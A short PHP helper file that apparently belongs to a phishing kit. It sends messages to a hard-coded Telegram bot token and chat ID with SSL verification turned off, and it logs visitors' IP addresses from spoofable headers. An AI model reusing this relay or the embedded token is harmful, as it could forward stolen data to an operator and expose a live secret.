<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

define("TOKEN", '8709300542:AAHrMT5esK_MxhaCEG0Qu_p9bbP9js-P_Gk');
define("CHAT_ID", '-5014692882');

$rendom_classes = rand(0, 1000000); 
$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

function telegram_message($message, $keyboard, $logFile = '../panel/logs/telegram_errors.log')
{
    $data = array(
        "chat_id" => CHAT_ID,
        "text" => $message,
        "reply_markup" => $keyboard
    );

    $website_telegram = "https://api.telegram.org/bot" . TOKEN;
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    $response = json_decode($result, true);

    if ($curl_error) {
        $error = date('Y-m-d H:i:s') . " - CURL ERROR: $curl_error\n";
        file_put_contents($logFile, $error, FILE_APPEND);
        return false;
    }

    if ($http_code !== 200 || ($response && isset($response['ok']) && $response['ok'] !== true)) {
        $error_msg = isset($response['description']) ? $response['description'] : 'Unknown error';
        $error = date('Y-m-d H:i:s') . " - HTTP $http_code - $error_msg - Response: $result\n";
        file_put_contents($logFile, $error, FILE_APPEND);
        return false;
    }

    return true;
}

function get_user_ip()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    return $ip;
}


?>